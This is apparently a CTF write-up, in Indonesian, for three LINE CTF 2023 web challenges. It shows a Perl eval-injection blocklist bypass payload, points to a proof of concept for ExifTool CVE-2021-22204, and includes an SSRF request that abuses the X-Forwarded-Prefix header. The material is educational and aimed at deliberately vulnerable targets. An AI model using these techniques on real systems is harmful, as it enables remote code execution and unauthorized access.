# Old Pal - web
## Description
How about an Old Pal for your aperitif?
http://104.198.120.186:11006/cgi-bin/main.pl?password=

## Exploit
Pada challenge ini kita diberikan source code sebagai berikut.

```perl 
#!/usr/bin/perl
use strict;
use warnings;

use CGI;
use URI::Escape;


$SIG{__WARN__} = \&warn;
sub warn {
    print("Hacker? :(");
    exit(1);
}


my $q = CGI->new;
print "Content-Type: text/html\n\n";


my $pw = uri_unescape(scalar $q->param("password"));
if ($pw eq '') {
    print "Hello :)";
    exit();
}
if (length($pw) >= 20) {
    print "Too long :(";
    die();
}
if ($pw =~ /[^0-9a-zA-Z_-]/) {
    print "Illegal character :(";
    die();
}
if ($pw !~ /[0-9]/ || $pw !~ /[a-zA-Z]/ || $pw !~ /[_-]/) {
    print "Weak password :(";
    die();
}
if ($pw =~ /[0-9_-][boxe]/i) {
    print "Do not punch me :(";
    die();
}
if ($pw =~ /AUTOLOAD|BEGIN|CHECK|DESTROY|END|INIT|UNITCHECK|abs|accept|alarm|atan2|bind|binmode|bless|break|caller|chdir|chmod|chomp|chop|chown|chr|chroot|close|closedir|connect|cos|crypt|dbmclose|dbmopen|defined|delete|die|dump|each|endgrent|endhostent|endnetent|endprotoent|endpwent|endservent|eof|eval|exec|exists|exit|fcntl|fileno|flock|fork|format|formline|getc|getgrent|getgrgid|getgrnam|gethostbyaddr|gethostbyname|gethostent|getlogin|getnetbyaddr|getnetbyname|getnetent|getpeername|getpgrp|getppid|getpriority|getprotobyname|getprotobynumber|getprotoent|getpwent|getpwnam|getpwuid|getservbyname|getservbyport|getservent|getsockname|getsockopt|glob|gmtime|goto|grep|hex|index|int|ioctl|join|keys|kill|last|lc|lcfirst|length|link|listen|local|localtime|log|lstat|map|mkdir|msgctl|msgget|msgrcv|msgsnd|my|next|not|oct|open|opendir|ord|our|pack|pipe|pop|pos|print|printf|prototype|push|quotemeta|rand|read|readdir|readline|readlink|readpipe|recv|redo|ref|rename|require|reset|return|reverse|rewinddir|rindex|rmdir|say|scalar|seek|seekdir|select|semctl|semget|semop|send|setgrent|sethostent|setnetent|setpgrp|setpriority|setprotoent|setpwent|setservent|setsockopt|shift|shmctl|shmget|shmread|shmwrite|shutdown|sin|sleep|socket|socketpair|sort|splice|split|sprintf|sqrt|srand|stat|state|study|substr|symlink|syscall|sysopen|sysread|sysseek|system|syswrite|tell|telldir|tie|tied|time|times|truncate|uc|ucfirst|umask|undef|unlink|unpack|unshift|untie|use|utime|values|vec|wait|waitpid|wantarray|warn|write/) {
    print "I know eval injection :(";
    die();
}
if ($pw =~ /[Mx. squ1ffy]/i) {
    print "You may have had one too many Old Pal :(";
    die();
}


if (eval("$pw == 20230325")) {
    print "Congrats! Flag is LINECTF{redacted}"
} else {
    print "wrong password :(";
    die();
};
```

Untuk membypass semua itu kita bisa menggunakan payload berikut.

```
20230325-v48
```

Dimana v48 equal denga '0' sehinggal nanti menghasilkan `20230325` yang merupakan password yang harus kita inputkan.

# Imagexif - web
## Description
This site provides you with the information of the image(EXIF) file. But there is a dangerous vulnerability here. I hope you get the data you want with the various functions of the system and your imagination.

## exploit
Pada challenge ini kita akan meng-eksploitasi [CVE-2021-22204](https://github.com/bilkoh/POC-CVE-2021-22204/blob/main/build_image.pl).

Saat kita melihat dockerfile pada backend kita akan menemukan bahwa mesin tersebut menggunakan versi exiftool yang vulnerable.

```dockerfile 
RUN wget https://github.com/exiftool/exiftool/archive/refs/tags/12.22.tar.gz && \
    tar xvf 12.22.tar.gz && \
    cp -fr /exiftool-12.22/* /usr/bin && \
    rm -rf /exiftool-12.22 && \
    rm 12.22.tar.gz
```

Kita akan menggunakan POC berikut untuk mendapatkan flagnya https://github.com/bilkoh/POC-CVE-2021-22204/blob/main/build_image.pl.

![](https://i.imgur.com/Xxs4FEo.png)

Jalankan perintah diatas dan nanti akan muncul image `notevil.jpg`, kita kirim image tersebut ke server dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/nv5sPuR.png)

# Adult Simple GoCurl - web
Pada challenge ini kita perlu membuat request ke `/flag`, disini kita bisa memanfaatkan fitur pada module gin golang yaitu `X-Forwarded-Prefix` untuk lebih jelasnya bisa dilihat disini https://github.com/gin-gonic/gin/pull/1238/commits/0906ea946d9f39dc5b8e9b4832d1eb9eaa8ca35f.

Fitur ini berfungsi untuk mengubah redirect dari golang dengan mendambahkan value yang kita berikan tadi ke header `Location`.

Berikut request yang saya gunakan untuk menyelesaikan challenge ini.

```http 
GET /curl/?url=http://127.0.0.1:8080//&header_key=X-Forwarded-Prefix&header_value=/flag HTTP/1.1
Host: 34.84.87.77:11001
Connection: close
```

![](https://i.imgur.com/RDif5Ht.png)

# Our Team Writeup
@daffainfo

https://github.com/daffainfo/ctf-writeup/tree/main/LINE%20CTF%202023
| Category | Challenge |
| --- | --- |
| Web | Baby Simple GoCurl

@kaelanalysis

https://github.com/maulvialf/CTF-Writeups/tree/main/2023/linectf
- rev
	1. fishing
	2. jumpit